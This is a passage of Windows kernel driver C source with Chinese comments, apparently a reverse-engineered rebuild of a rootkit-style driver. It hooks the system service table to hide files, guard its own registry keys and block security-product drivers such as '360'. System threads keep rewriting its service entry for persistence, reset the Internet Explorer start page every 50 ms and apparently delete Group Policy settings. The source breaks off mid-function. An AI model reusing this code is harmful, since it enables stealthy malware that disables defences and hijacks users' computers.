	 NameOffset = ((ULONG)&(((PFILE_DIRECTORY_INFORMATION)curr)->FileName)) - ((ULONG)curr);
	 NameSizeOffset = ((ULONG)&(((PFILE_DIRECTORY_INFORMATION)curr)->FileNameLength)) - (ULONG)curr);      
	 break;
	 */

	case FileFullDirectoryInformation:
		NameOffset = ((ULONG)&(((PFILE_FULL_DIR_INFORMATION)curr)->FileName)) - ((ULONG)curr);
		NameSizeOffset = ((ULONG)&(((PFILE_FULL_DIR_INFORMATION)curr)->FileNameLength)) - ((ULONG)curr);           
		break;

	case FileBothDirectoryInformation:
		NameOffset = ((ULONG)&(((PFILE_BOTH_DIR_INFORMATION)curr)->FileName)) - ((ULONG)curr);
		NameSizeOffset = ((ULONG)&(((PFILE_BOTH_DIR_INFORMATION)curr)->FileNameLength)) - ((ULONG)curr);       
		break;

	case FileNamesInformation:
		NameOffset = ((ULONG)&(((PFILE_NAMES_INFORMATION)curr)->FileName)) - ((ULONG)curr);
		NameSizeOffset = ((ULONG)&(((PFILE_NAMES_INFORMATION)curr)->FileNameLength)) - ((ULONG)curr);         
		break;

	case FileIdBothDirectoryInformation:
		NameOffset = ((ULONG)&(((PFILE_ID_BOTH_DIR_INFORMATION)curr)->FileName)) - ((ULONG)curr);
		NameSizeOffset = ((ULONG)&(((PFILE_ID_BOTH_DIR_INFORMATION)curr)->FileNameLength)) - ((ULONG)curr); 
		break;

	case FileIdFullDirectoryInformation:
		NameOffset = ((ULONG)&(((PFILE_ID_FULL_DIR_INFORMATION)curr)->FileName)) - ((ULONG)curr);
		NameSizeOffset = ((ULONG)&(((PFILE_ID_FULL_DIR_INFORMATION)curr)->FileNameLength)) - ((ULONG)curr);   
		break;        

	default:
		return status;      
	}

	for(i=0; i<NbFileToHide; i++) {

		curr = FileInformation;  

		prev = NULL;
		while( curr ) {

			DeltaCurr = (PULONG)curr;
			DeltaPrev = (PULONG)prev;

			FileNamePtr = (WCHAR*)((PBYTE)curr + NameOffset);
			FileNameLength = (PULONG) ((PBYTE)curr + NameSizeOffset);         

			if( FileNamePtr!=NULL && *FileNameLength == wcslen(FileToHide[i])*2 &&\
				!memcmp( FileNamePtr,FileToHide[i],(SIZE_T) * FileNameLength ) ) {    
					// 为要隐藏的文件,隐藏之
					if( !prev ) {
						if( *DeltaCurr )
							(PBYTE)FileInformation += *DeltaCurr;
						else
							FileInformation = NULL;   
					} else {
						if( *DeltaCurr )
							*DeltaPrev += *DeltaCurr; 
						else
							*DeltaPrev = 0;   
					}    
			} else {
				prev = curr;
			}

			if( *DeltaCurr )  
				curr += *DeltaCurr;
			else  
				curr = NULL;

		}
	}

	return status;
}



NTSTATUS
fake_ZwSaveKey(
			   IN HANDLE KeyHandle,
			   IN HANDLE FileHandle
			   )
			   /*++

			   逆向: sudami  08/02/28

			   功能 : 
			   替换函数 ZwSaveKey.保护自身注册表键值

			   --*/
{
	NTSTATUS   status;
	PVOID      pObject;
	DWORD	   d_size;
	PUNICODE_STRING p_wcName;
	UNICODE_STRING  ucName;

	RtlInitUnicodeString( &ucName, reg_name);

	// 为要查询的内容分配空间
	p_wcName = (PUNICODE_STRING) ExAllocatePool(PagedPool, sizeof(UNICODE_STRING)\
		+(sizeof(WCHAR)*1024));

	if (p_wcName == NULL)
		return NULL;

	p_wcName->Length = 0;
	p_wcName->MaximumLength = 1022;
	p_wcName->Buffer = (PWSTR)((DWORD)p_wcName + sizeof(UNICODE_STRING));

	// 通过handle得到object
	status = ObReferenceObjectByHandle (KeyHandle, FILE_ANY_ACCESS, NULL,\
		KernelMode, &pObject, NULL);
	if( !NT_SUCCESS(status) ) {
		ExFreePool(p_wcName);
		return status;
	}

	ObDereferenceObject( pObject );

	// 通过object得到name
	status = ObQueryNameString (pObject, (POBJECT_NAME_INFORMATION) p_wcName,\
		p_wcName->MaximumLength, &d_size);

	if (NT_SUCCESS (status)) {
		if ( RtlCompareUnicodeString( p_wcName, &ucName, TRUE ) == 0) {
			// 嘿嘿,是要设置的子项,返回deny
			// nvmini够很的。在HLKM\SYSTEM处就进行了拦截
			ExFreePool(p_wcName);

			return STATUS_PRIVILEGE_NOT_HELD;
		}
	}

	ExFreePool(p_wcName);
	status = Orig_ZwSaveKey (KeyHandle, FileHandle);	

	return status; 
}


NTSTATUS
fake_ZwDeleteKey(
				 IN HANDLE KeyHandle
				 )
				 /*++

				 逆向: sudami  08/02/28

				 功能 : 
				 替换函数 ZwDeleteKey.保护自身注册表键值

				 --*/
{
	NTSTATUS   status;
	PVOID      pObject;
	DWORD	   d_size;
	PUNICODE_STRING p_wcName;
	PWSTR     p_wcStr;

	// 为要查询的内容分配空间
	p_wcName = (PUNICODE_STRING) ExAllocatePool(PagedPool, sizeof(UNICODE_STRING)\
		+(sizeof(WCHAR)*1024));

	if (p_wcName == NULL)
		return NULL;

	p_wcName->Length = 0;
	p_wcName->MaximumLength = 1022;
	p_wcName->Buffer = (PWSTR)((DWORD)p_wcName + sizeof(UNICODE_STRING));

	// 通过handle得到object
	status = ObReferenceObjectByHandle (KeyHandle, FILE_ANY_ACCESS, NULL,\
		KernelMode, &pObject, NULL);
	if( !NT_SUCCESS(status) ) {
		ExFreePool(p_wcName);
		return status;
	}

	ObDereferenceObject( pObject );

	// 通过object得到name
	status = ObQueryNameString (pObject, (POBJECT_NAME_INFORMATION) p_wcName,\
		p_wcName->MaximumLength, &d_size);

	p_wcStr = (PWSTR)(p_wcName->Buffer);

	if (NT_SUCCESS (status)) { // 过滤
		if ( (wcsstr( p_wcStr, L"nvmini" ) != NULL) || \
			(wcsstr ( p_wcStr, L"LEGACY_NVMINI") != NULL) ) {

				ExFreePool(p_wcName);
				return STATUS_PRIVILEGE_NOT_HELD;
		}
	}

	ExFreePool(p_wcName);
	status = Orig_ZwDeleteKey (KeyHandle);	

	return status; 
}


NTSTATUS
fake_ZwDeleteValueKey(
					  IN HANDLE  KeyHandle,
					  IN PUNICODE_STRING  ValueName
					  )
					  /*++

					  逆向: sudami  08/02/28

					  功能 : 
					  替换函数 ZwDeleteValueKey.保护自身注册表键值

					  --*/
{
	NTSTATUS   status;
	PVOID      pObject;
	DWORD	   d_size;
	PUNICODE_STRING p_wcName;
	PWSTR     p_wcStr;

	// 为要查询的内容分配空间
	p_wcName = (PUNICODE_STRING) ExAllocatePool(PagedPool, sizeof(UNICODE_STRING)\
		+(sizeof(WCHAR)*1024));

	if (p_wcName == NULL)
		return NULL;

	p_wcName->Length = 0;
	p_wcName->MaximumLength = 1022;
	p_wcName->Buffer = (PWSTR)((DWORD)p_wcName + sizeof(UNICODE_STRING));

	// 通过handle得到object
	status = ObReferenceObjectByHandle (KeyHandle, FILE_ANY_ACCESS, NULL,\
		KernelMode, &pObject, NULL);
	if( !NT_SUCCESS(status) ) {
		ExFreePool(p_wcName);
		return status;
	}

	ObDereferenceObject( pObject );

	// 通过object得到name
	status = ObQueryNameString (pObject, (POBJECT_NAME_INFORMATION) p_wcName,\
		p_wcName->MaximumLength, &d_size);

	p_wcStr = (PWSTR)(p_wcName->Buffer);

	if (NT_SUCCESS (status)) { // 过滤
		if ( (wcsstr( p_wcStr, L"nvmini" ) != NULL) || \
			(wcsstr ( p_wcStr, L"LEGACY_NVMINI") != NULL) ) {

				ExFreePool(p_wcName);
				return STATUS_PRIVILEGE_NOT_HELD;
		}
	}

	ExFreePool(p_wcName);
	status = Orig_ZwDeleteValueKey (KeyHandle, ValueName);	

	return status; 
}


NTSTATUS 
fake_ZwLoadDriver(
				  IN PUNICODE_STRING  DriverServiceName
				  )
				  /*++

				  逆向: sudami  08/02/28

				  参数:
				  DriverServiceName - 要加载的驱动在注册表中的子键

				  功能 : 
				  替换函数ZwLoadDriver.禁止指定列表中的驱动加载.禁止导入表中含有SSDT的驱动的加载

				  --*/
{

	NTSTATUS   status;
	OBJECT_ATTRIBUTES oa;
	PUNICODE_STRING   p_a = NULL;
	UNICODE_STRING    ucName;
	ULONG             ResultLength;
	HANDLE            KeyHandle;
	PVOID			  p;
	PKEY_VALUE_PARTIAL_INFORMATION valueInfoP;
	ULONG     valueInfoLength, returnLength;
	PWCHAR            ValueName = NULL;
	WCHAR Name[300];

	RtlCopyMemory(Name , DriverServiceName->Buffer, DriverServiceName->MaximumLength );
	_wcsupr(Name);

	// 若字符串中包含列表中的内容,就过滤掉
	if ( (wcsstr( Name, ban_1 ) != NULL) || 
		(wcsstr( Name, ban_2 ) != NULL) || 
		(wcsstr( Name, ban_3 ) != NULL) || 
		(wcsstr( Name, ban_4 ) != NULL) || 
		(wcsstr( Name, ban_5 ) != NULL) || 
		(wcsstr( Name, ban_6 ) != NULL) || 
		(wcsstr( Name, ban_7 ) != NULL) || 
		(wcsstr( Name, ban_8 ) != NULL) || 
		(wcsstr( Name, ban_9 ) != NULL) || 
		(wcsstr( Name, ban_a ) != NULL) || 
		(wcsstr( Name, ban_b ) != NULL) || 
		(wcsstr( Name, ban_c ) != NULL) ||
		(wcsstr( Name, ban_e ) != NULL) ||
		(wcsstr( Name, L"MP1" ) != NULL)||
		(wcsstr( Name, L"360" ) != NULL) ||
		(wcsstr( Name, L"SNIPE" ) != NULL)) {

			return STATUS_ACCESS_DENIED;
			//g_CurrentHandle = PsGetCurrentProcessId ();
	} else { // 查看其驱动是否包含SDT

		InitializeObjectAttributes (&oa,DriverServiceName,OBJ_CASE_INSENSITIVE,NULL,NULL);
		status = ZwOpenKey( &KeyHandle, KEY_ALL_ACCESS, &oa );

		if (NT_SUCCESS (status)) {

			RtlInitUnicodeString( &ucName, ban_d ); // ImagePath
			valueInfoLength = sizeof( KEY_VALUE_PARTIAL_INFORMATION ) + 100;
			valueInfoP      =    (PKEY_VALUE_PARTIAL_INFORMATION) \
				ExAllocatePoolWithTag (NonPagedPool, valueInfoLength, 'skdD');

			if ( valueInfoP == NULL ) { // 分配内存失败
				ZwClose (KeyHandle);
				return Orig_ZwLoadDriver( DriverServiceName );	
			}

			status = ZwQueryValueKey (KeyHandle, &ucName, 2, \
				valueInfoP, valueInfoLength, &returnLength);

			if ( NT_SUCCESS(status) ) { // 把驱动的全路径赋给 ValueName变量
				RtlCopyMemory((PCHAR)ValueName, (PCHAR)valueInfoP->Data, valueInfoP->DataLength);

				if (IsExistSDT( (PCWSTR)ValueName ) == TRUE) { // 此驱动的导入表中含有SDT,不让其加载

					ZwClose (KeyHandle);
					ExFreePool (valueInfoP);
					return STATUS_ACCESS_DENIED;
				}
			}

			ExFreePool (valueInfoP);
		}

		ZwClose (KeyHandle);
	}	


	return Orig_ZwLoadDriver( DriverServiceName );
}

BOOL IsExistSDT(PWCHAR FullPath)
			/*++

			逆向: sudami  08/02/28

			参数:
			FullPath - 要加载的驱动的完整路径

			功能 : 
			通过sys全路径.打开它,映射4KB的内容到进程虚拟空间, 找到导入表.
			对每个导入的DLL,遍历IMAGE_THUNK_DATA数组,查找其中的导入函数,
			若名称与KeServiceDescriptorTable匹配.则宣告查找成功.直接返回
			TRUE到fake_ZwLoadDriver中. 让其加载失败. -.=|

			--*/

{
	NTSTATUS   status;
	OBJECT_ATTRIBUTES oa;
	IO_STATUS_BLOCK   io;
	UNICODE_STRING    wc_FullPath;
	ULONG             Ntheader_adr;
	HANDLE            hSection, hFile, hMod; 
	SIZE_T            size = 0;
	PVOID             BaseAddress = NULL;
	IMAGE_DOS_HEADER           *dosheader;
	IMAGE_OPTIONAL_HEADER      *opthdr;
	IMAGE_IMPORT_DESCRIPTOR    *pImportDesc;
	IMAGE_THUNK_DATA           *pThunk;
	IMAGE_IMPORT_BY_NAME       *pImportName;
	CHAR                       *pszDllName;
	BYTE                       *pName;
	SECTION_IMAGE_INFORMATION  sii;

	RtlInitUnicodeString( &wc_FullPath, FullPath ); 
	InitializeObjectAttributes (&oa, &wc_FullPath, OBJ_CASE_INSENSITIVE,NULL,NULL);

	status = ZwOpenFile( &hFile, 0x100020, &oa, &io, 1, 0x20 );
	if ( !NT_SUCCESS (status) ) {
		DbgPrint("IsExistSDT --> ZwOpenFile failed.");
		return FALSE;
	}

	oa.ObjectName = 0;
	status = ZwCreateSection( &hSection, SECTION_ALL_ACCESS, &oa, 0,PAGE_EXECUTE, SEC_IMAGE, hFile);
	if ( !NT_SUCCESS (status) ) {
		DbgPrint("IsExistSDT --> ZwCreateSection failed.");
		ZwClose (hFile);
		return FALSE;
	}

	status =  ZwMapViewOfSection( hSection, NtCurrentProcess(), &BaseAddress, 0, 1000, 0,\
		&size, (SECTION_INHERIT)1, /*MEM_TOP_DOWN*/0x100000, /*PAGE_READWRITE*/4 ); 
	if ( !NT_SUCCESS (status) ) {
		DbgPrint("IsExistSDT --> ZwMapViewOfSection failed.");
		ZwClose (hFile);
		ZwClose (hSection);
		return FALSE;
	}

	// 开始搜索PE了
	hMod = BaseAddress;
	dosheader = (IMAGE_DOS_HEADER *)hMod;
	opthdr =(IMAGE_OPTIONAL_HEADER *) ((BYTE*)hMod + dosheader->e_lfanew + 24);

	//取得导入表首地址
	pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)hMod + \
		opthdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	while (pImportDesc->FirstThunk) {  //取得模块名称
		pszDllName = (char*)((BYTE*)hMod + pImportDesc->Name);
		if (pszDllName == NULL) {
			break;
		}

		if (pImportDesc->FirstThunk) { 
			pThunk = (IMAGE_THUNK_DATA*)((BYTE*)hMod + pImportDesc->FirstThunk);

			while (pThunk->u1.AddressOfData) {

				pImportName = (IMAGE_IMPORT_BY_NAME*) (&(pThunk->u1.AddressOfData));

				//IAT表就是一个DWORD 数组，每个成员记录一个函数地址
				pName = (BYTE*)&(pImportName->Name);
				if ( !strcmp( pName, "KeServiceDescriptorTable" ) ){
					return TRUE;
				}
				pThunk++;
			}
		}
	}

	return FALSE;
}


VOID 
MyStartHook ( )
/*++

逆向: sudami  08/02/28

参数:
bhook - 标志hook或者unhook

功能:
hook ssdt,加个Timer反复回写hook
unhook ssdt, 去除Timer [和原idb有部分出入.实现同样功能即可]

--*/
{

	if( !ZwClose_Hooked ) { // 1
		WPOFF();

		(ZWCLOSE) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_Close)) = fake_ZwClose;

		WPON();
		ZwClose_Hooked = TRUE;
	}


	if( !ZwLoadDriver_Hooked ) { // 2
		WPOFF();
		(ZWLOADDRIVER) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_LoadDriver)) = fake_ZwLoadDriver;
		WPON();
		ZwLoadDriver_Hooked = TRUE;
	}


	if( !ZwQueryDirectoryFile_Hooked ) { // 3
		WPOFF();

		(ZWQUERYDIRECTORYFILE) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_QueryDirectoryFile) ) = fake_ZwQueryDirectoryFile;

		WPON();
		ZwQueryDirectoryFile_Hooked = TRUE;
	}


	if( !ZwSaveKey_Hooked ) { // 4
		WPOFF();

		(ZWSAVEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_SaveKey) ) = fake_ZwSaveKey;

		WPON();
		ZwSaveKey_Hooked = TRUE;
	}

	if( !ZwDeleteKey_Hooked ) { // 5
		WPOFF();

		(ZWDELETEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_DeleteKey) ) = fake_ZwDeleteKey;

		WPON();
		ZwDeleteKey_Hooked = TRUE;
	}

	if( !ZwEnumerateKey_Hooked ) { // 6
		WPOFF();

		(ZWENUMERATEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_EnumerateKey) ) = fake_ZwEnumerateKey;

		WPON();
		ZwEnumerateKey_Hooked = TRUE;
	}

	if( !ZwDeleteValueKey_Hooked ) { // 7
		WPOFF();

		(ZWDELETEVALUEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_DeleteValueKey) ) = fake_ZwDeleteValueKey;

		WPON();
		ZwDeleteValueKey_Hooked = TRUE;
	}
}

VOID 
MyUnHook ()
{
	if( ZwClose_Hooked ) { // 1
		WPOFF();

		(ZWCLOSE) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_Close)) = Orig_ZwClose;

		WPON();
	}

	if( ZwLoadDriver_Hooked ) { // 2
		WPOFF();

		(ZWLOADDRIVER) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_LoadDriver)) = Orig_ZwLoadDriver;

		WPON();
	}

	if( ZwQueryDirectoryFile_Hooked ) { // 3
		WPOFF();

		(ZWQUERYDIRECTORYFILE) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_QueryDirectoryFile) ) = Orig_ZwQueryDirectoryFile;

		WPON();
	}


	if( ZwSaveKey_Hooked ) { // 4
		WPOFF();

		(ZWSAVEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_SaveKey) ) = Orig_ZwSaveKey;

		WPON();
	}

	if( ZwDeleteKey_Hooked ) { // 5
		WPOFF();

		(ZWDELETEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_DeleteKey) ) = Orig_ZwDeleteKey;

		WPON();
	}

	if( ZwEnumerateKey_Hooked ) { // 6
		WPOFF();

		(ZWENUMERATEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_EnumerateKey) ) = Orig_ZwEnumerateKey;

		WPON();
	}

	if( ZwDeleteValueKey_Hooked ) { // 7
		WPOFF();

		(ZWDELETEVALUEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_DeleteValueKey) ) = Orig_ZwDeleteValueKey;

		WPON();
	}
}


/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+            下面是3个函数反复回写注册表服务项              +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--

NTSTATUS
SetSysRegKey (
			  HANDLE Key
			  )
			  /*++

			  逆向: sudami  08/02/28

			  参数:
			  Key - 子键的句柄

			  功能:
			  添加驱动服务

			  --*/
{
	NTSTATUS status;
	UNICODE_STRING name;
	ULONG value;
	WCHAR RegKeyValue[128] = L"Pointer Port";
	WCHAR RegKeyValue_a[128] = L"sudami的无聊驱动";
	WCHAR RegKeyValue_b[128] = L"system32\\DRIVERS\\sudami.sys";

	value = 0;
	RtlInitUnicodeString (&name, L"ErrorControl");
	status = ZwSetValueKey (Key,
		&name,
		0,
		REG_DWORD,
		&value,
		sizeof (value));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	value = 2;
	RtlInitUnicodeString (&name, L"Start");
	status = ZwSetValueKey (Key,
		&name,
		0,
		REG_DWORD,
		&value,
		sizeof (value));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	value = 1;
	RtlInitUnicodeString (&name, L"Type");
	status = ZwSetValueKey (Key,
		&name,
		0,
		REG_DWORD,
		&value,
		sizeof (value));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	value = 7;
	RtlInitUnicodeString (&name, L"Tag");
	status = ZwSetValueKey (Key,
		&name,
		0,
		REG_DWORD,
		&value,
		sizeof (value));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	RtlInitUnicodeString (&name, L"Group");
	status = ZwSetValueKey (Key,
		&name,
		0,
		REG_SZ,
		RegKeyValue,
		sizeof (RegKeyValue));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	RtlInitUnicodeString (&name, L"DisplayName");
	status = ZwSetValueKey (Key,
		&name,
		0,
		REG_SZ,
		RegKeyValue_a,
		sizeof (RegKeyValue_a));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	RtlInitUnicodeString (&name, L"ImagePath");
	status = ZwSetValueKey (Key,
		&name,
		0,
		REG_EXPAND_SZ,
		L"system32\\DRIVERS\\sudami.sys",
		sizeof (L"system32\\DRIVERS\\sudami.sys"));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	// 都设置好了,成功返回
	return STATUS_SUCCESS;
}


VOID
Thread_WriteReg (
				 IN PVOID StartContext
				 )
				 /*++

				 逆向: sudami  08/02/28

				 功能:
				 启动一个系统线程来反复写注册表. 真流氓啊 o(*.*)0

				 --*/
{
	NTSTATUS		status;
	HANDLE          KeyHandle;
	UNICODE_STRING  KeyName;
	WCHAR			Buffer[128];
	IO_STATUS_BLOCK     IoStatusBlock;
	OBJECT_ATTRIBUTES   objectAttributes;

	/* 创建事件对象 */
	InitializeObjectAttributes( &objectAttributes,
		NULL,
		OBJ_OPENIF|OBJ_KERNEL_HANDLE,
		(HANDLE) NULL,
		(PSECURITY_DESCRIPTOR) NULL );

	status = ZwCreateEvent( &g_EventHandle,
		EVENT_ALL_ACCESS,
		&objectAttributes,
		0,
		FALSE );

	if (!NT_SUCCESS(status)) {
		PsTerminateSystemThread( status );
	}

	status = ObReferenceObjectByHandle (g_EventHandle, FILE_ANY_ACCESS, NULL,\
		KernelMode, &pEventObject, NULL);
	if( !NT_SUCCESS(status) ) {
		return;
	}

	swprintf( Buffer, L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", L"sudami" );
	RtlInitUnicodeString( &KeyName, Buffer );

	InitializeObjectAttributes(
		&objectAttributes,
		&KeyName,
		OBJ_CASE_INSENSITIVE,
		(HANDLE)NULL,
		NULL
		);

	while (TRUE) { /*------------- 反复循环写入 --------------*/

		if (g_bRepeatWrite_reg == FALSE) {
			ZwClose( g_EventHandle );
			PsTerminateSystemThread( STATUS_SUCCESS );
		}

		status = ZwOpenKey(
			&KeyHandle,
			KEY_READ | KEY_WRITE,
			&objectAttributes
			);

		if (!NT_SUCCESS(status)) { // 不存在就创建之
			status = ZwCreateKey(
				&KeyHandle,
				KEY_ALL_ACCESS,
				&objectAttributes,
				0,
				NULL,
				0,
				NULL);

			if (!NT_SUCCESS(status)) {
				PsTerminateSystemThread( status );
			}  
		}

		// 哈哈,开始写注册表啦. retry and retry ...
		status = SetSysRegKey( KeyHandle );

		// 监视要保护的注册表键值,一有改动就通知,流氓啊~~~~
		// 一监视到改动，就设置事件对象为signaled 状态
		// 所以卸载时,要用KeSetEvent来终止等待,然后设置 g_bRepeatWrite
		// 为0 退出循环
		//
		//PS:   
		// 突然发现内核Timer由于IRQL等各种原因,非常容易蓝,俺调试了好久都没成功.
		// 于是换用系统线程实现循环.
		// [add 08/03/03 sudami] 
		ZwNotifyChangeKey( KeyHandle, g_EventHandle, 0, 0, &IoStatusBlock, \
			15, TRUE, NULL, 0, TRUE );

		// 一直等待，直到该事件变为受信状态
		ZwWaitForSingleObject( g_EventHandle, FALSE, NULL ); 
		ZwClose( KeyHandle );
	} 
}


BOOL 
StartThread_reg (
				 )
				 /*++

				 逆向: sudami  08/02/28

				 功能:
				 启动一个系统线程来反复写注册表. 真流氓啊 o(*.*)0

				 --*/
{
	HANDLE ThreadHandle;
	if (!NT_SUCCESS(PsCreateSystemThread (&ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		0L,
		NULL,
		Thread_WriteReg,
		NULL))) {
			return FALSE;
	}

	ObReferenceObjectByHandle (ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		(PVOID *)&pThreadObj_reg,
		NULL);


	g_bRepeatWrite_reg = TRUE;
	ZwClose (ThreadHandle);
	return TRUE;
}

/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+            下面是3个函数反复回写注册表IE首页              +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--


NTSTATUS
SetRegKey_IE (
			  HANDLE Key
			  )
			  /*++

			  逆向: sudami  08/02/28

			  参数:
			  Key - 子键的句柄

			  功能:
			  添加驱动服务

			  --*/
{
	NTSTATUS status;
	UNICODE_STRING IE;
	WCHAR IE_a[128]          = L"http://hi.baidu.com/sudami";

	RtlInitUnicodeString (&IE, L"Start Page");
	status = ZwSetValueKey (Key,
		&IE,
		0,
		REG_SZ,
		IE_a,
		sizeof (IE_a));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	// 都设置好了,成功返回
	return STATUS_SUCCESS;
}


VOID
Thread_WriteReg_IE (
					IN PVOID StartContext
					)
					/*++

					逆向: sudami  08/02/28

					功能:
					启动一个系统线程来反复写注册表. 真流氓啊 o(*.*)0

					--*/
{
	NTSTATUS		status;
	HANDLE          KeyHandle = NULL;
	UNICODE_STRING  KeyName;
	WCHAR			Buffer[128];
	IO_STATUS_BLOCK     IoStatusBlock;
	OBJECT_ATTRIBUTES   objectAttributes;
	UNICODE_STRING		a;
	PEPROCESS			proc;

	LARGE_INTEGER interval;
	interval.QuadPart = -5 * 1000 * 100;     // 50ms, relative


	/* 2次调用,得到services.exe的EPROCESS */

	status = GetEProcessByName (L"EXPLORER.EXE", &proc);
	if( !NT_SUCCESS(status) ) {
		status = GetEProcessByName (L"explorer.exe", &proc); 

		if( !NT_SUCCESS(status) )  
			return;
	}

	/* 附着到此进程上 */
	KeAttachProcess (proc); 
	RtlFormatCurrentUserKeyPath( &a );
	KeDetachProcess();


	/* 得到CurrentUser下指定子键的全路径 */
	KeyName.Length = 0;
	KeyName.MaximumLength = (USHORT)(a.MaximumLength  +
		sizeof( L"\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\MAIN" ) +
		sizeof( UNICODE_NULL ));
	KeyName.Buffer =  (RtlAllocateStringRoutine)( KeyName.MaximumLength );
	if (KeyName.Buffer == NULL) {
		DbgPrint("KeyName->Buffer == NULL, failed\n");
		return;
	}

	status = RtlAppendUnicodeStringToString( &KeyName, &a );
	if ( !NT_SUCCESS( status )) {
		DbgPrint("RtlAppendUnicodeStringToString( &KeyName, &a ); failed: %08lx\n", status); 
	}

	status = RtlAppendUnicodeToString( &KeyName, L"\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\MAIN" );
	if ( !NT_SUCCESS( status )) {
		DbgPrint("\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\MAIN -- failed: %08lx\n", status); 
	}

	DbgPrint("%ws\n", KeyName.Buffer);

	InitializeObjectAttributes(
		&objectAttributes,
		&KeyName,
		OBJ_CASE_INSENSITIVE,
		(HANDLE)NULL,
		NULL
		);

	while (TRUE) { 

		if (g_bRepeatWrite_reg_IE == FALSE) {
			PsTerminateSystemThread( STATUS_SUCCESS );
		}
		//status = MyOpenUserKey( Buffer, KeyName, KeyHandle );

		status = ZwOpenKey(
			&KeyHandle,
			KEY_READ | KEY_WRITE,
			&objectAttributes
			);

		if (!NT_SUCCESS(status)) { // 不存在就创建之
			status = ZwCreateKey(
				&KeyHandle,
				KEY_ALL_ACCESS,
				&objectAttributes,
				0,
				NULL,
				0,
				NULL);

			if (!NT_SUCCESS(status)) {
				PsTerminateSystemThread( status );
			}  
		}

		// 哈哈,开始写注册表啦. retry and retry ...
		SetRegKey_IE( KeyHandle );
		ZwClose( KeyHandle );
		KeDelayExecutionThread( KernelMode, FALSE, &interval );
	} // end-while
}

BOOL 
StartThread_reg_IE (
				 )
				 /*++

				 逆向: sudami  08/02/28

				 功能:
				 启动一个系统线程来反复写注册表. 真流氓啊 o(*.*)0

				 --*/
{
	HANDLE ThreadHandle;
	if (!NT_SUCCESS(PsCreateSystemThread (&ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		0L,
		NULL,
		Thread_WriteReg_IE,
		NULL))) {
			return FALSE;
	}

	ObReferenceObjectByHandle (ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		(PVOID *)&pThreadObj_reg_IE,
		NULL);


	g_bRepeatWrite_reg_IE = TRUE;
	ZwClose (ThreadHandle);
	return TRUE;
}


/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+          下面3个函数反复删除注册表的权限设置项            +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--


VOID
Thread_WriteReg_Group (
					   IN PVOID StartContext
					   )
{
	NTSTATUS		status;
	HANDLE          KeyHandle;
	UNICODE_STRING  KeyName;
	WCHAR			Buffer[128];
	OBJECT_ATTRIBUTES   objectAttributes;

	LARGE_INTEGER interval;
	interval.QuadPart = -5 * 1000 * 10;     // 5ms, relative


	swprintf( Buffer, L"\\REGISTRY\\MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\%s", L"GROUP POLICY" );
	RtlInitUnicodeString( &KeyName, Buffer );

	InitializeObjectAttributes(
		&objectAttributes,
		&KeyName,
		OBJ_CASE_INSENSITIVE,
		(HANDLE)NULL,
		NULL
		);

	while (TRUE) { 

		if (g_bRepeatWrite_reg_Group == FALSE) {
			PsTerminateSystemThread( STATUS_SUCCESS );
		}

		status = ZwOpenKey(
			&KeyHandle,
			KEY_READ | KEY_WRITE,
			&objectAttributes
			);

		if (NT_SUCCESS(status)) { //若存在，就删除掉
